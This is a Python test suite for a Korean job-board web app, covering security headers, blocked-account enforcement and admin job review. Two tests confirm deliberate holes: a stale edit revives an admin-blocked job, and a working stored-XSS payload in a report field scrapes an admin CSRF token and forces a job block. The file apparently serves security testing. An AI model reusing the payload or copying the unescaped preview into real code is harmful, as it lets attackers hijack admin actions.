        self.assertEqual(response.headers["Referrer-Policy"], "strict-origin-when-cross-origin")
        self.assertEqual(
            response.headers["Permissions-Policy"],
            "camera=(), microphone=(), geolocation=()",
        )
        self.assertIn("object-src 'none'", response.headers["Content-Security-Policy"])
        self.assertNotIn("unsafe-inline", response.headers["Content-Security-Policy"])

        join_response = self.client.get("/join")
        self.assertIn("img-src 'self' data:;", join_response.headers["Content-Security-Policy"])
        self.assertNotIn(
            "img-src 'self' data: https:",
            join_response.headers["Content-Security-Policy"],
        )
        nonce_match = re.search(
            r"script-src 'self' 'nonce-([^']+)'", join_response.headers["Content-Security-Policy"]
        )
        self.assertIsNotNone(nonce_match)
        self.assertIn(f'nonce="{nonce_match.group(1)}"', join_response.get_data(as_text=True))

        original_secure = app.config["SESSION_COOKIE_SECURE"]
        app.config["SESSION_COOKIE_SECURE"] = True
        try:
            secure_response = self.client.get("/jobs")
        finally:
            app.config["SESSION_COOKIE_SECURE"] = original_secure
        self.assertIn("max-age=31536000", secure_response.headers["Strict-Transport-Security"])

    def test_blocked_jobseeker_session_cannot_read_chat(self):
        application_id, _resume_id = self.create_application_with_resume()
        self.set_session(self.ids["user"], "jobseeker")
        self.block_user(self.ids["user"])

        response = self.client.get(
            f"/applications/{application_id}/chat", follow_redirects=True
        )

        self.assertEqual(response.status_code, 200)
        self.assertIn("관리자에 의해 차단된 계정입니다.".encode(), response.data)
        self.assert_session_cleared()

    def test_blocked_jobseeker_session_cannot_send_or_poll_chat_messages(self):
        application_id, _resume_id = self.create_application_with_resume()
        self.block_user(self.ids["user"])

        self.set_session(self.ids["user"], "jobseeker")
        send_response = self.client.post(
            f"/applications/{application_id}/chat/messages",
            data={"content": "차단 이후 메시지"},
        )
        self.assertEqual(send_response.status_code, 403)
        self.assertEqual(
            send_response.get_json(), {"error": "관리자에 의해 차단된 계정입니다."}
        )
        self.assert_session_cleared()

        with app.app_context():
            self.assertEqual(ChatMessage.query.filter_by(application_id=application_id).count(), 0)

        self.set_session(self.ids["user"], "jobseeker")
        poll_response = self.client.get(
            f"/applications/{application_id}/chat/messages?after=0"
        )
        self.assertEqual(poll_response.status_code, 403)
        self.assertEqual(
            poll_response.get_json(), {"error": "관리자에 의해 차단된 계정입니다."}
        )
        self.assert_session_cleared()

    def test_blocked_jobseeker_session_cannot_apply_cancel_or_upload_resume(self):
        application_id, resume_id = self.create_application_with_resume()
        with app.app_context():
            new_job = Job(
                company_id=self.ids["company"],
                title="차단 사용자 지원 대상",
                content="내용",
                deadline=date.today() + timedelta(days=1),
                status="approved",
            )
            db.session.add(new_job)
            db.session.commit()
            new_job_id = new_job.job_id
        self.block_user(self.ids["user"])

        for method, path, data in (
            ("post", f"/jobs/{new_job_id}/apply", {}),
            ("post", f"/mypage/applications/{application_id}/cancel", {}),
            ("post", "/mypage/resumes/upload", {}),
            ("get", f"/mypage/resumes/{resume_id}/preview", {}),
        ):
            with self.subTest(path=path):
                self.set_session(self.ids["user"], "jobseeker")
                response = getattr(self.client, method)(path, data=data)
                self.assertEqual(response.status_code, 302)
                self.assertIn("/login", response.headers["Location"])
                self.assert_session_cleared()

        with app.app_context():
            self.assertIsNone(
                Application.query.filter_by(
                    user_id=self.ids["user"], job_id=new_job_id
                ).first()
            )
            self.assertEqual(
                db.session.get(Application, application_id).status, "submitted"
            )
            self.assertEqual(Resume.query.filter_by(user_id=self.ids["user"]).count(), 1)

    def test_blocked_company_session_cannot_use_dashboard_or_chat(self):
        application_id, _resume_id = self.create_application_with_resume()
        self.block_user(self.ids["company_user"])

        self.set_session(self.ids["company_user"], "company")
        dashboard = self.client.get("/company/jobs")
        self.assertEqual(dashboard.status_code, 302)
        self.assertIn("/login", dashboard.headers["Location"])
        self.assert_session_cleared()

        self.set_session(self.ids["company_user"], "company")
        send_response = self.client.post(
            f"/applications/{application_id}/chat/messages",
            data={"content": "차단 기업 메시지"},
        )
        self.assertEqual(send_response.status_code, 403)
        self.assert_session_cleared()

    def test_active_sessions_and_anonymous_public_pages_still_work(self):
        application_id, _resume_id = self.create_application_with_resume()

        self.assertEqual(self.client.get("/jobs").status_code, 200)
        self.assertEqual(self.client.get("/reviews").status_code, 200)

        self.set_session(self.ids["user"], "jobseeker")
        self.assertEqual(
            self.client.get(f"/applications/{application_id}/chat").status_code, 200
        )

        self.set_session(self.ids["company_user"], "company")
        self.assertEqual(self.client.get("/company/jobs").status_code, 200)

    def test_approved_job_edit_keeps_trust_and_admin_sees_reviewed_snapshot(self):
        with app.app_context():
            job = Job(
                company_id=self.ids["company"],
                title="정상 공고",
                content="관리자 검토 내용",
                deadline=date.today() + timedelta(days=10),
                status="pending",
            )
            db.session.add(job)
            db.session.commit()
            job_id = job.job_id

        self.set_session(self.ids["admin"], "admin")
        self.assertEqual(self.client.post(f"/admin/jobs/{job_id}/approve").status_code, 302)

        self.set_session(self.ids["company_user"], "company")
        response = self.client.post(
            f"/company/jobs/{job_id}/edit",
            data={
                "title": "검토되지 않은 공고",
                "content": "승인 후 변경된 내용",
                "deadline": (date.today() + timedelta(days=10)).isoformat(),
                "original_status": "approved",
            },
        )
        self.assertEqual(response.status_code, 302)

        with app.app_context():
            job = db.session.get(Job, job_id)
            self.assertEqual(job.status, "approved")
            self.assertEqual(job.reviewed_title, "정상 공고")
            self.assertEqual(job.title, "검토되지 않은 공고")

        public_page = self.client.get(f"/jobs/{job_id}").get_data(as_text=True)
        self.assertIn("검토되지 않은 공고", public_page)
        self.set_session(self.ids["admin"], "admin")
        admin_page = self.client.get("/admin/jobs").get_data(as_text=True)
        self.assertIn("정상 공고", admin_page)
        self.assertNotIn("검토되지 않은 공고", admin_page)

    def test_stale_edit_request_revives_report_blocked_job(self):
        company_client = app.test_client()
        user_client = app.test_client()
        admin_client = app.test_client()
        self.set_session(self.ids["company_user"], "company", company_client)
        self.set_session(self.ids["user"], "jobseeker", user_client)
        self.set_session(self.ids["admin"], "admin", admin_client)

        edit_url = f"/company/jobs/{self.ids['active']}/edit"
        edit_page = company_client.get(edit_url)
        self.assertIn(b'name="original_status" value="approved"', edit_page.data)

        user_client.post(
            f"/jobs/{self.ids['active']}/report",
            data={"reason_category": "fraud_suspected", "reason_detail": "확인 필요"},
        )
        with app.app_context():
            report_id = Report.query.filter_by(target_id=self.ids["active"]).one().report_id

        admin_client.post(
            f"/admin/reports/jobs/{report_id}/resolve",
            data={"decision": "block"},
        )
        with app.app_context():
            self.assertEqual(db.session.get(Job, self.ids["active"]).status, "blocked")

        company_client.post(
            edit_url,
            data={
                "title": "오래된 화면에서 수정",
                "content": "차단 이후 저장",
                "deadline": (date.today() + timedelta(days=1)).isoformat(),
                "original_status": "approved",
            },
        )
        with app.app_context():
            self.assertEqual(db.session.get(Job, self.ids["active"]).status, "approved")

    def test_report_preview_xss_can_induce_an_admin_job_block(self):
        target_job_id = self.ids["expired_pending"]
        payload = (
            '<img src=x onerror="fetch(\'/admin/jobs\').then(r=>r.text()).then(t=>fetch('
            f"'/admin/jobs/{target_job_id}/block',"
            "{method:'POST',body:new URLSearchParams({csrf_token:new DOMParser()."
            "parseFromString(t,'text/html').querySelector('[name=csrf_token]').value})}))\">"
        )
        self.assertLessEqual(len(payload), 500)
        self.set_session(self.ids["user"], "jobseeker")
        self.client.post(
            f"/jobs/{self.ids['active']}/report",
            data={"reason_category": "etc", "reason_detail": payload},
        )
        with app.app_context():
            report_id = Report.query.filter_by(target_id=self.ids["active"]).one().report_id

        anonymous_client = app.test_client()
        anonymous_preview = anonymous_client.get(
            f"/admin/reports/jobs/{report_id}/preview"
        )
        self.assertEqual(anonymous_preview.status_code, 302)
        self.assertIn("/login", anonymous_preview.headers["Location"])

        self.set_session(self.ids["admin"], "admin")
        listing = self.client.get("/admin/reports/jobs?status=pending").get_data(as_text=True)
        self.assertIn("&lt;img", listing)
        self.assertNotIn("<img src=x", listing)
        preview = self.client.get(f"/admin/reports/jobs/{report_id}/preview")
        self.assertIn(payload, preview.get_data(as_text=True))
        self.assertIn("'unsafe-inline'", preview.headers["Content-Security-Policy"])

        app.config["WTF_CSRF_ENABLED"] = True
        try:
            admin_jobs = self.client.get("/admin/jobs").get_data(as_text=True)
            csrf_token = re.search(
                r'name="csrf_token" value="([^"]+)"', admin_jobs
            ).group(1)
            induced_action = self.client.post(
                f"/admin/jobs/{target_job_id}/block",
                data={"csrf_token": csrf_token},
            )
        finally:
            app.config["WTF_CSRF_ENABLED"] = False

        self.assertEqual(induced_action.status_code, 302)
        with app.app_context():
            self.assertEqual(db.session.get(Job, target_job_id).status, "blocked")


if __name__ == "__main__":
    unittest.main()
